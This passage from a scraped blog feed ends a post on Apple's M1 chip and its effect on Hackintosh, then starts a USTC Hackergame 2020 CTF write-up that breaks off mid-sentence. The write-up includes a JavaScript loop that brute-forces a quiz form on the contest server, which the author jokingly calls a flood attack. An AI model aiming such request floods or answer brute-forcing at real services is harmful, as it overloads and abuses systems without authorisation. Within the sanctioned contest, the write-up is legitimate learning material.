Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 